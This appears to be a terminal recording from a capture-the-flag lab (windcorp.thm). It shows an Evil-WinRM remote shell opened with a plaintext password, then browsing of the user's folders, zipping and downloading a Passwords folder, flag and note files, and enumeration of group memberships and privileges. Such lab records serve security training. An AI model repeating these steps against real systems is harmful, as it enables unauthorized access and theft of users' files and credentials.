@@ -1,0 +1,163 @@
+Script started on 2025-04-10 11:21:05+03:00 [COMMAND="evil-winrm -i windcorp.thm -u buse -p 'uzunLM+3131'" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+                                        
+[0;34mEvil-WinRM shell v3.7[0m
+                                        
+[0;1;33mWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine[0m
+                                        
+[0;35mData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion[0m
+                                        
+[0;34mInfo: Establishing connection to remote endpoint[0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\buse\Documents> dir
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\buse\Documents> cd ..
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\buse> dir
+
+
+    Directory: C:\Users\buse
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         5/1/2020   3:25 AM                3D Objects
+d-r---         5/1/2020   3:25 AM                Contacts
+d-r---         5/7/2020   3:01 AM                Desktop
+d-r---         5/7/2020   3:08 AM                Documents
+d-r---         5/2/2020   1:18 PM                Downloads
+d-r---         5/1/2020   3:25 AM                Favorites
+d-r---         5/1/2020   3:25 AM                Links
+d-r---         5/1/2020   3:25 AM                Music
+d-r---         5/1/2020   3:25 AM                Pictures
+d-r---         5/1/2020   3:25 AM                Saved Games
+d-r---         5/1/2020   3:25 AM                Searches
+d-r---         5/1/2020   3:25 AM                Videos
+-a----         5/2/2020   4:56 AM            164 .sparkExt.properties
+-a----        4/10/2025  12:42 AM            315 sip-communicator.properties
+
+
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\buse> cd Desktop
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\buse\Desktop> dir
+
+
+    Directory: C:\Users\buse\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         5/7/2020   3:00 AM                Also stuff
+d-----         5/7/2020   2:58 AM                Stuff
+-a----         5/2/2020  11:53 AM             45 Flag 2.txt
+-a----         5/1/2020   8:33 AM             37 Notes.txt
+
+
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\buse\Desktop> type [44G[43G[K[42G[K[41G[K[40G[Kdob[42G[Kwbloa[46G[K[45G[K[44G[K[43G[Knload "Flag 2.txt"
+                                        
+[0;34mInfo: Downloading C:\Users\buse\Desktop\Flag 2.txt to Flag 2.txt[0m
+Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|                                                  
+[0;34mInfo: Download successful![0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\buse\Desktop> download Notes.txt
+                                        
+[0;34mInfo: Downloading C:\Users\buse\Desktop\Notes.txt to Notes.txt[0m
+Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|                                                  
+[0;34mInfo: Download successful![0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\buse\Desktop> cd Stuff
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\buse\Desktop\Stuff> dir
+
+
+    Directory: C:\Users\buse\Desktop\Stuff
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         5/7/2020   2:58 AM                Passwords
+
+
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\buse\Desktop\Stuff> cd Passwords
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\buse\Desktop\Stuff\Passwords> dir
+
+
+    Directory: C:\Users\buse\Desktop\Stuff\Passwords
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         5/7/2020   2:58 AM              8 Facebook.txt
+
+
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\buse\Desktop\Stuff\Passwords> cd ../..
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\buse\Desktop> Compress-Archive -Path 'Stuff' -DestinationPath 'Stuff.zip'
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\buse\Desktop> Compress-Archive -Path 'Also stuff' -DestinationPath 'AlsoStuff.z ip'
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\buse\Desktop> dir
+
+
+    Directory: C:\Users\buse\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         5/7/2020   3:00 AM                Also stuff
+d-----         5/7/2020   2:58 AM                Stuff
+-a----        4/10/2025   1:25 AM         154131 AlsoStuff.zip
+-a----         5/2/2020  11:53 AM             45 Flag 2.txt
+-a----         5/1/2020   8:33 AM             37 Notes.txt
+-a----        4/10/2025   1:25 AM            164 Stuff.zip
+
+
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\buse\Desktop> download Stuff.zip
+                                        
+[0;34mInfo: Downloading C:\Users\buse\Desktop\Stuff.zip to Stuff.zip[0m
+Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|                                                  
+[0;34mInfo: Download successful![0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\buse\Desktop> download AlsoStuff.zip
+                                        
+[0;34mInfo: Downloading C:\Users\buse\Desktop\AlsoStuff.zip to AlsoStuff.zip[0m
+Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|                                                  
+[0;34mInfo: Download successful![0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\buse\Desktop> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name     SID
+============= ============================================
+windcorp\buse S-1-5-21-555431066-3599073733-176599750-5777
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                          Attributes
+=========================================== ================ ============================================ ==================================================
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Account Operators                   Alias            S-1-5-32-548                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+WINDCORP\IT                                 Group            S-1-5-21-555431066-3599073733-176599750-5865 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\buse\Desktop> exit
+                                        
+[0;34mInfo: Exiting with code 0[0m
+
+Script done on 2025-04-10 11:27:59+03:00 [COMMAND_EXIT_CODE="0"]
